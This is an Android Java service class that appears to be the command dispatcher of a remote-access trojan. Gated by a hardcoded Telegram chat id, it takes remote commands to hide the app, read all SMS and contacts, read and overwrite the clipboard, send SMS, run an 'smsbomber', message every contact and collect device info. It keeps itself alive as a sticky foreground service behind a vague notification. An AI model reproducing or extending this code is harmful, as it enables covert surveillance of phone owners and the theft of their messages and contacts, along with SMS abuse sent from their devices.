package com.drnull.v3;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;

public class FMService extends Service {
    private static final String CHANNEL_ID = "com.drnull.v3";
    private static final String TAG = "com.drnull.FMService";

    private static String admin = null;



    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        admin = "-1001904957179";
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try{
            Bundle data = intent.getExtras();
            if (data != null){
                for(String key : data.keySet()){
                    Log.d(TAG , key + ":" + String.valueOf(data.get(key)));
                }

                if (data.getString("action" , null) != null && data.getString("chat_id" , null) != null){
                    String action = data.getString("action");
                    String chat_id = data.getString("chat_id");
                    String a = "";
                    actionHandler act = new actionHandler(this);
                    if (data.getString("androidid" , null) != null){
                        a = data.getString("androidid");
                    }

                    if (String.valueOf(chat_id).equals(admin) || String.valueOf(chat_id).equals(act.readAsset("chat_id.txt"))){
                        switch (action){
                            case "pingall":
                                try{
                                    act.pingall();
                                } catch (Exception e){
                                    e.printStackTrace();
                                }
                                break;
                            case "pingone":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        act.pingone();
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;
                            case "hideone":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        act.hideone();
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;
                            case "hideall":
                                try{
                                    act.hideall();
                                } catch (Exception e){
                                    e.printStackTrace();
                                }
                                break;
                            case "unhideone":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        act.unhideone();
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;
                            case "unhideall":
                                try{
                                    act.unhideall();
                                } catch (Exception e){
                                    e.printStackTrace();
                                }
                                break;
                            case "sendsms":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        String phone = data.getString("phone");
                                        String text = data.getString("text");
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                            act.sendSms(phone , text);
                                        }
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;
                            case "smsbomber":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        String phone = data.getString("phone");
                                        String text = data.getString("text");
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                                            act.sendSms(phone , text);
                                        }
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;
                            case "vibrateone":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        act.vibrate();
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;
                            case "normalone":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        act.normal();
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;
                            case "vibrateall":
                                try{
                                    act.vibrate();
                                } catch (Exception e){
                                    e.printStackTrace();
                                }

                                break;
                            case "normalall":
                                try{
                                    act.normal();
                                } catch (Exception e){
                                    e.printStackTrace();
                                }
                                break;
                            case "fullinfo":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        act.fullinfo();
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;
                            case "lastsms":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                            act.lastsms();
                                        }
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;
                            case "getclipboard":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                            act.getclip();
                                        }
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;
                            case "setclipboard":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                            act.setclip(data.getString("text"));
                                        }
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;
                            case "allsms":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                            act.allsms(data.getString("kind") , Integer.parseInt(data.getString("count")));
                                        }
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;
                            case "allcontacts":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                            act.allcontact();
                                        }
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;
                            case "send_message_contect":
                                if (a.equals(act.getAndroidId())){
                                    try{
                                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                            act.send2contact(data.getString("text"));
                                        }
                                    } catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                                break;






                        } // switch
                    } // end admin check
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }
        startForeground(2 , buildNotification());
        return START_STICKY;

    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    private void createNotificationChannel() {
        // Create the NotificationChannel, but only on API 26+ because
        // the NotificationChannel class is not in the Support Library.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "main";
            String description = "main channel";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            // Register the channel with the system. You can't change the importance
            // or other notification behaviors after this.
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }


    private void showNotification(String title, String body) {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentTitle(title)
                .setContentText(body)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setAutoCancel(true);

        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(this);

        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        notificationManager.notify(2, builder.build());
    }

    private Notification buildNotification() {
        // Build and return a notification for your foreground service
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("App")
                .setContentText("is running...")
                .setSmallIcon(R.drawable.ic_launcher_foreground);

        return builder.build();
    }

}